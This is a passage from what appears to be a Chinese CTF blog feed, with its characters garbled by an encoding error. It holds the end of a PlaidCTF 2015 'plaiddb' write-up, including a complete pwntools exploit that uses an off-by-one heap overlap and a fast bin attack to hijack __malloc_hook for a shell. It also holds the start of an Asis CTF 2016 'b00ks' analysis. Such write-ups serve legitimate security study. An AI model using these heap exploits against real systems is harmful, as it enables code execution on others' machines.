2015ã€‘plaiddb31.png"></p><p>æœ€åæ‰§è¡Œä¸€æ¬¡ <code>DEL()</code></p><p>åˆ©ç”¨Â <code>sub_1040()</code>Â å‡½æ•°ä¸­çš„Â <code>malloc(8)</code>Â è§¦å‘ one_gadget å³å¯è·å¾— shell</p><hr><h1 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># è®¾ç½®ç³»ç»Ÿæ¶æ„, æ‰“å°è°ƒè¯•ä¿¡æ¯</span><span class="token comment"># arch å¯é€‰ : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN è¿œç¨‹ : content = 0, PWN æœ¬åœ° : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class="token punctuation">)</span> <span class="token comment"># ubuntu 16.04 Glibc 2.23</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>    <span class="token comment"># å°†æœ¬åœ°çš„ Linux ç¨‹åºå¯åŠ¨ä¸ºè¿›ç¨‹ io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./datastore'</span><span class="token punctuation">)</span><span class="token comment"># é™„åŠ  gdb è°ƒè¯•</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>  <span class="token comment"># åªæœ‰æœ¬åœ°æ‰å¯è°ƒè¯•ï¼Œè¿œç¨‹æ— æ³•è°ƒè¯•</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">PUT</span><span class="token punctuation">(</span>row_key<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">b'PUT'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'size:\n'</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span> <span class="token operator">&lt;</span> size<span class="token punctuation">:</span>        data <span class="token operator">=</span> data<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span>size<span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'data:\n'</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">DEL</span><span class="token punctuation">(</span>row_key<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">'DEL'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">GET</span><span class="token punctuation">(</span>row_key<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'command:\n'</span><span class="token punctuation">,</span> <span class="token string">'GET'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'key:\n'</span><span class="token punctuation">,</span> row_key<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>    num <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b' bytes'</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token string">b' bytes'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':\n'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token comment"># ç›¸å…³å‡½æ•°å®ç°çš„æ—¶å€™ç”¨åˆ°äº†ä¸€äº› 0x38 å¤§å°çš„å—ï¼Œé¿å…å½±å“æˆ‘ä»¬æå‰æä¸€äº›</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    PUT<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    DEL<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>PUT<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'1'</span><span class="token punctuation">)</span>   <span class="token comment"># è®¾ç½®çš„å¤§ä¸€äº›ï¼Œåé¢åˆ†é…çš„æ—¶å€™ä¼šä¼˜å…ˆå°†å…¶åˆ†é…å‡ºå»ï¼Œä½†åˆ†é…çš„è¿‡å¤§å°±ä¸ä¼šç‰©ç†ç›¸è¿äº†ï¼Œå®æµ‹ç»•ä¸å¼€åé¢çš„é—®é¢˜</span>PUT<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token string">b'2'</span><span class="token punctuation">)</span>    <span class="token comment"># ç”¨æ¥éƒ½ libc çš„å·²åˆ†é…å—ï¼Œè¡¨é¢ä¸Šæœªåˆ†é…ï¼Œå¤§å°ç¬¦åˆ fast bin å³å¯ï¼Œæš‚æœªéªŒè¯</span>PUT<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'3'</span><span class="token punctuation">)</span>    <span class="token comment"># ç”¨æ¥è¿›è¡Œ fast bin attack çš„å—ï¼Œå¤§å°åº”è¯¥ç¬¦åˆ fast bin å³å¯ï¼Œæš‚æœªéªŒè¯</span>PUT<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">,</span> <span class="token number">0x1f8</span><span class="token punctuation">,</span> <span class="token string">b'4'</span><span class="token punctuation">)</span>   <span class="token comment"># ç”¨æ¥æº¢å‡ºçš„å—ï¼Œæº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªå—çš„ pre_size æŠŠä»–ä¿®æ”¹æˆä¸Šé¢å…¨éƒ¨å—å¤§å°çš„å’Œ</span>PUT<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">,</span> <span class="token number">0xf0</span><span class="token punctuation">,</span> <span class="token string">b'5'</span><span class="token punctuation">)</span>    <span class="token comment"># ç”¨æ¥è¢«æº¢å‡ºçš„å—</span>PUT<span class="token punctuation">(</span><span class="token string">b'defense'</span><span class="token punctuation">,</span> <span class="token number">0x400</span><span class="token punctuation">,</span> <span class="token string">b'defense-top chunk'</span><span class="token punctuation">)</span>   <span class="token comment"># ç”¨æ¥é˜²æ­¢è¢« top chunk åˆå¹¶</span>DEL<span class="token punctuation">(</span><span class="token string">b'3'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'1'</span><span class="token punctuation">)</span>DEL<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x1f0</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x4e0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># æº¢å‡ºï¼Œ0x4e0 = 0x200 + 0x50 + 0x68 + 0x1f8 + 0x30 (è¿™æ˜¯æ²¡æœ‰è¢«ä½¿ç”¨çš„æŒ‡é’ˆéƒ¨åˆ†å¤§å°ï¼Œä¸‰ä¸ª)</span>DEL<span class="token punctuation">(</span><span class="token string">b'5'</span><span class="token punctuation">)</span>   <span class="token comment"># åˆå¹¶ 1 2 5 3 4 å—</span>PUT<span class="token punctuation">(</span><span class="token string">b'0x200'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'fillup'</span><span class="token punctuation">)</span>   <span class="token comment"># è¿™é‡Œæ˜¯åœ¨ defense å—åˆ†é…åå¯¼è‡´æ¸…ç†ç¢ç‰‡æ¸…ç†ï¼Œå¤šå‡ºæ¥ä¸€ä¸ª 0x360 çš„ small bin è¦å…ˆæŠŠä»–åˆ†é…æ‰</span>PUT<span class="token punctuation">(</span><span class="token string">b'0x200 fillup'</span><span class="token punctuation">,</span> <span class="token number">0x200</span><span class="token punctuation">,</span> <span class="token string">b'fillup again'</span><span class="token punctuation">)</span>   <span class="token comment"># æŠŠ 1 åˆ†é…æ‰ï¼Œè¿™æ · 2 å°±æ˜¯ç¬¬ä¸€ä¸ªå—äº†ï¼Œå¯ä»¥æ‰“å°ç›¸å…³åœ°å€ï¼Œæ³„æ¼ libc åŸºåœ°å€</span>libc_leak <span class="token operator">=</span> u64<span class="token punctuation">(</span>GET<span class="token punctuation">(</span><span class="token string">'2'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_leak: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_leak<span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_leak <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>libc_base <span class="token operator">=</span> __malloc_hook_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># è¿™äº›å—ç‰©ç†ç›¸è¿ï¼Œa*58 ä¹‹åæ­£å¥½æ˜¯ 5 å—çš„ size å’Œ fdï¼Œä¿®æ”¹å³å¯æ§åˆ¶ä¸‹ä¸€ä¸ª fast bin çš„ä½ç½®</span><span class="token comment"># -0x10 æ˜¯ä¸ºäº†ç•™å‡ºæŒ‡é’ˆç©ºé—´ï¼Œ-3 æ˜¯ä¸ºäº†æŠŠæŒ‡é’ˆæ‰€æŒ‡çš„ __malloc_hook å¤„çš„ 7f åœ°å€æå‰ï¼Œå½“æˆ pre_size ç›¸å…³å†…å®¹ï¼Œå¦åˆ™ fake_fast bin æ ¼å¼ä¸ç¬¦åˆè¦æ±‚</span><span class="token comment"># debug()</span>PUT<span class="token punctuation">(</span><span class="token string">b'fastatk'</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__malloc_hook_addr <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>PUT<span class="token punctuation">(</span><span class="token string">b'prepare'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'prepare data'</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>PUT<span class="token punctuation">(</span><span class="token string">b'attack'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'DEL'</span><span class="token punctuation">)</span> <span class="token comment"># malloc(8) å‡ºå‘ one_gadget</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="ç»“æœ"><a href="#ç»“æœ" class="headerlink" title="ç»“æœ"></a>ç»“æœ</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb32.png" alt="ã€plaidctf 2015ã€‘plaiddb32.png"></p>]]></content>
    
    
    <summary type="html">è¿™é“é¢˜çŸ¥è¯†ç‚¹è¾ƒå¤šï¼Œæ¼æ´åˆ©ç”¨è¾ƒå¤æ‚ï¼Œåˆ©ç”¨ off-by-one æ¼æ´é€ æˆ Overlap æ¥æ³„éœ² libc åŸºåœ°å€ï¼Œå¹¶é€šè¿‡ fast bin attack é”™ä½ä¼ªé€  chunk åŠ«æŒ __malloc_hook ä¸º one_gadget æ¥ getshellï¼Œè¦æ±‚å¯¹å †çš„åˆ†é…æœºåˆ¶è¾ƒä¸ºç†Ÿç»ƒ</summary>
    
    
    
    <category term="äºŒè¿›åˆ¶æ¼æ´åˆ©ç”¨" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>ã€Asis CTF 2016ã€‘b00ks</title>
    <link href="https://www.uf4te.cn/posts/18c02ebd.html"/>
    <id>https://www.uf4te.cn/posts/18c02ebd.html</id>
    <published>2024-05-29T11:15:04.000Z</published>
    <updated>2024-06-05T06:36:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æ”¶è·"><a href="#æ”¶è·" class="headerlink" title="æ”¶è·"></a>æ”¶è·</h1><ul><li><p>åˆ©ç”¨ off-by-one æ¼æ´ä¿®æ”¹æŒ‡å‘å †çš„æŒ‡é’ˆï¼Œå¹¶åœ¨ä¿®æ”¹åçš„æŒ‡é’ˆæŒ‡å‘çš„å †åœ°å€å¤„ä¼ªé€ ä¸€ä¸ªå †å—</p></li><li><p><mark>åˆ©ç”¨ <code>mmap</code> åˆ†é…çš„å†…å­˜ä¸ libc ä¹‹å‰å­˜åœ¨å›ºå®šçš„åç§»çš„ç‰¹ç‚¹ï¼Œæ¨ç®—å‡º libc çš„åŸºåœ°å€</mark></p></li><li><p><mark>ç”±äº <code>unsorted bin</code> æ˜¯åŒå‘é“¾è¡¨ï¼Œåˆ©ç”¨ç¬¬ä¸€ä¸ª <code>unsorted bin</code> çš„ <code>bk</code> æŒ‡é’ˆæŒ‡å‘ libc ä¸­çš„åœ°å€çš„ç‰¹ç‚¹ï¼Œæ ¹æ®åç§»å¾—åˆ° <code>__malloc_hook</code> çœŸå®åœ°å€ï¼Œè¿›è€Œé€šè¿‡ <code>__malloc_hook</code> çš„ libc åç§»è®¡ç®— libc åŸºåœ°å€</mark></p></li><li><p>é€šè¿‡åŠ«æŒ <code>__free_hook</code> ä¸º <code>system()</code> æˆ– one_gadget æ¥è·å¾— shell</p></li></ul><hr><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">ã€Asis CTF 2016ã€‘b00ks</a></p><hr><h1 id="æ€è·¯ä¸€ï¼ˆmmapï¼‰"><a href="#æ€è·¯ä¸€ï¼ˆmmapï¼‰" class="headerlink" title="æ€è·¯ä¸€ï¼ˆmmapï¼‰"></a>æ€è·¯ä¸€ï¼ˆmmapï¼‰</h1><blockquote><p>æœ¬åœ°ç¯å¢ƒï¼šGlibc 2.23</p></blockquote><p>æŸ¥çœ‹ä¿æŠ¤ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks1.png" alt="ã€Asis CTF 2016ã€‘b00ks1.png"></p><p>IDA ä¸‹åˆ†æï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks2.png" alt="ã€Asis CTF 2016ã€‘b00ks2.png"></p><p>ä¸€ä¸ªèœå•é¢˜ï¼Œæ ¹æ®åŠŸèƒ½é€‰é¡¹ï¼Œå°†ç›¸åº”åŠŸèƒ½çš„å‡½æ•°é‡å‘½å</p><p><code>Menu()</code> èœå•ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks3.png" alt="ã€Asis CTF 2016ã€‘b00ks3.png"></p><p><code>Create()</code> åˆ›å»ºï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks5.png" alt="ã€Asis CTF 2016ã€‘b00ks5.png"></p><p><code>Delete()</code> åˆ é™¤ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks6.png" alt="ã€Asis CTF 2016ã€‘b00ks6.png"></p><p><code>Edit()</code> ç¼–è¾‘ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks7.png" alt="ã€Asis CTF 2016ã€‘b00ks7.png"></p><p><code>Print()</code> æ‰“å°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks8.png" alt="ã€Asis CTF 2016ã€‘b00ks8.png"></p><p><code>Change()</code> ä¿®æ”¹ä½œè€…åï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks9.png" alt="ã€Asis CTF 2016ã€‘b00ks9.png"></p><p>ç¨‹åºåœ¨åˆšå¼€å§‹æ‰§è¡Œ <code>Menu()</code> æ˜¾ç¤ºèœå•ä¹‹å‰ï¼Œä¼šåœ¨ <code>Change()</code> ä¸­å…ˆè®©è¾“å…¥ä½œè€…å <code>author name</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks4.png" alt="ã€Asis CTF 2016ã€‘b00ks4.png"></p><p>è¿™é‡Œçš„è¾“å…¥ç”±è‡ªå®šä¹‰çš„ <code>my_read()</code> å®ç°ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks10.png" alt="ã€Asis CTF 2016ã€‘b00ks10.png"></p><p>ä»”ç»†è§‚å¯Ÿ <code>my_read()</code> å¯ä»¥å‘ç°ï¼Œè¿™é‡Œæ˜¯å­˜åœ¨æ¼æ´çš„ï¼šå¦‚æœæˆ‘ä»¬è¾“å…¥çš„å­—ç¬¦ä¸²é•¿åº¦ <code>a2 = 1</code>ï¼Œå®é™…ä¸Šä¼šè¯»å…¥ 2 ä¸ªå­—ç¬¦ï¼Œç¬¬äºŒä¸ªå­—ç¬¦ <code>&#39;\n&#39;</code> ä¼šè¢«èµ‹å€¼ä¸º <code>&#39;\x00&#39;</code></p><p>ä½œè€…å <code>author name</code> å†™å…¥çš„åœ°å€ä½äº BSS æ®µçš„ <code>unk_202040</code>ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks11.png" alt="ã€Asis CTF 2016ã€‘b00ks11.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks12.png" alt="ã€Asis CTF 2016ã€‘b00ks12.png"></p><p>åœ¨ <code>Create()</code> ä¸­åˆ›å»ºä¹¦æ—¶ï¼Œå¦‚æœå·²å­˜åœ¨çš„ä¹¦çš„æ•°é‡ <code>v2 &lt; 20</code>ï¼ˆæœªå­˜æ»¡ï¼‰ï¼Œä¼šé€šè¿‡ <code>malloc</code> åˆ†é… 0x20 çš„ç©ºé—´æ¥å­˜æ”¾ä¹¦çš„ç»“æ„</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks13.png" alt="ã€Asis CTF 2016ã€‘b00ks13.png"></p><p>å¹¶å°† <code>malloc</code> åˆ†é…çš„ç©ºé—´é¦–åœ°å€å­˜å‚¨åœ¨ <code>off_202010 + v2</code> çš„åœ°æ–¹ï¼Œå¯ä»¥çœ‹åˆ°å…¶å­˜æ”¾åœ¨ BSS æ®µçš„ <code>unk_202060</code> å¤„ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks14.png" alt="ã€Asis CTF 2016ã€‘b00ks14.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks16.png" alt="ã€Asis CTF 2016ã€‘b00ks16.png"></p><p>åˆ†æå¯çŸ¥ï¼Œä¹¦çš„ç»“æ„åŒ…æ‹¬ï¼š</p><ul><li>ä¹¦çš„åºå· <code>book_id</code></li><li>ä¹¦å <code>name</code></li><li>ä¹¦çš„æè¿° <code>description</code></li><li>ä¹¦çš„æè¿°çš„å¤§å° <code>size</code></li></ul><p>ä¸ºäº†æ–¹ä¾¿ç†è§£ï¼Œç”¨å›¾è¡¨ç¤ºå‡ºæ¥å°±æ˜¯è¿™æ ·ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks15.png" alt="ã€Asis CTF 2016ã€‘b00ks15.png"></p><p>ä¸Šå›¾ä¸­ï¼Œæ©™è‰²åŒºåŸŸå­˜å‚¨ä½œè€…å <code>author name</code>ï¼Œç»¿è‰²åŒºåŸŸå­˜å‚¨çš„æ˜¯ä¹¦çš„æ•°ç»„ <code>book[]</code></p><blockquote><p><strong>æœ‰å¤šå°‘æœ¬ä¹¦å°±æœ‰å¤šå°‘ä¸ª <code>book[]</code> æ•°ç»„å…ƒç´ ï¼Œ<code>book[]</code> çš„æ¯ä¸€ä¸ªæ•°ç»„å…ƒç´ éƒ½æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘å †ä¸­çš„ä¸€ä¸ªç»“æ„ä½“</strong></p><p>è¿™ä¸ªç»“æ„ä½“æœ‰å››ä¸ªå±æ€§ï¼šä¹¦çš„åºå· <code>book_id</code>ã€ä¹¦å <code>name</code>ã€ä¹¦çš„æè¿° <code>description</code> å’Œä¹¦çš„æè¿°çš„å¤§å° <code>size</code></p></blockquote><p>ç”±äºè¿™é‡Œ <code>unk_202040</code> å’Œ <code>unk_202060</code> åˆšå¥½ç›¸è· 0x20ï¼Œå› æ­¤ <code>my_read(off_202018, 32LL)</code> å¤„å­˜åœ¨ off-by-one æ¼æ´ï¼Œåˆšå¥½æº¢å‡º 1 å­—èŠ‚</p><p>ä¸ºäº†æ³„éœ²å‡ºå †ä¸­çš„åœ°å€ï¼Œå¯ä»¥å€ŸåŠ©å­˜å‚¨åœ¨ <code>unk_202060</code> ä¸­çš„æŒ‡é’ˆï¼Œè€Œåœ¨ <code>Print()</code> ä¸­ä¼šå°† <code>unk_202040</code> å¤„å­˜å‚¨çš„ <code>author name</code> é€šè¿‡ <code>%s</code> æ‰“å°å‡ºæ¥ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks17.png" alt="ã€Asis CTF 2016ã€‘b00ks17.png"></p><p>å› æ­¤ï¼Œæˆ‘ä»¬é¦–å…ˆå‘ <code>unk_202040</code> å†™å…¥ 0x20 ä¸ªå­—èŠ‚ï¼Œå°†ç©ºé—´å…¨éƒ¨å¡«æ»¡ï¼Œè¿™æ ·å°±ä¸å­˜åœ¨ <code>&#39;\x00&#39;</code> æˆªæ–­ï¼Œç”±äº <code>my_read()</code> è¿˜ä¼šå¤šå†™å…¥ 1 å­—èŠ‚ <code>&#39;\x00&#39;</code> è¦†ç›– <code>book[0]</code> çš„æœ€ä½ä½ï¼Œä½†æ˜¯ä¸å½±å“ï¼Œå› ä¸ºå½“æˆ‘ä»¬åˆ›å»º <code>book[0]</code> çš„æ—¶å€™å¤šå‡ºçš„é‚£ 1 å­—èŠ‚ <code>&#39;\x00&#39;</code> åˆä¼šè¢« <code>book[0]</code> å­˜å‚¨çš„æŒ‡é’ˆç»™è¦†ç›–æ‰</p><p>å½“æˆ‘ä»¬åˆ›å»ºå¥½ <code>book[0]</code> åï¼Œæ­¤æ—¶ <code>unk_202040</code> ä¸ <code>book[0]</code> æ˜¯ç›´æ¥ç›¸è¿çš„ï¼Œä¸­é—´ä¸å­˜åœ¨ <code>&#39;\x00&#39;</code> æˆªæ–­ï¼Œå› æ­¤æˆ‘ä»¬åªéœ€è¦è°ƒç”¨ä¸€æ¬¡ <code>Print()</code> å°±å¯ä»¥æ³„éœ²å‡º <code>book[0]</code> å­˜å‚¨çš„æŒ‡é’ˆ</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks18.png" alt="ã€Asis CTF 2016ã€‘b00ks18.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks19.png" alt="ã€Asis CTF 2016ã€‘b00ks19.png"></p><p>åˆ›å»ºä¸¤æœ¬ä¹¦è¿›è¡Œæµ‹è¯•ï¼Œå‘ç°ä¸¤ä¸ª <code>book[]</code> å­˜å‚¨çš„æŒ‡é’ˆä¹‹é—´çš„åç§»æ˜¯ 0x30ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks21.png" alt="ã€Asis CTF 2016ã€‘b00ks21.png"></p><p>å †ä¸­çš„å­˜å‚¨ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks22.png" alt="ã€Asis CTF 2016ã€‘b00ks22.png"></p><p>å› 